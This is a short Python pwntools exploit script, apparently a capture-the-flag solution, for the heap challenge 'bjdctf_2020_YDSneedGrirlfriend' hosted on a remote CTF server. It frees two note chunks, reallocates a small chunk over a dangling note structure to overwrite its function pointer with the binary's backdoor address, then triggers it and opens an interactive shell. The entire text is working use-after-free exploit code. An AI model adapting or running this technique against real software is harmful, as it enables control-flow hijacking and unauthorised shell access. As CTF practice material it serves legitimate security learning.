from pwn import *

#p = process('./bjdctf_2020_YDSneedGrirlfriend')
p = remote('node4.buuoj.cn', 26792)
elf = ELF('bjdctf_2020_YDSneedGrirlfriend')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + '\n' + s)

def alloc(size, name):
    p.sendlineafter(b'choice :', b'1')
    p.sendlineafter(b'size is :', str(size).encode())
    p.sendafter(b'name is :', name)

def delete(index):
    p.sendlineafter(b'choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())

def show(index):
    p.sendlineafter(b'choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())

backdoor = elf.sym['backdoor']

alloc(0x20, b'a') #0
alloc(0x20, b'a') #1
delete(0)
delete(1)

alloc(0x10, p64(backdoor) + p64(0))
show(0)

p.interactive()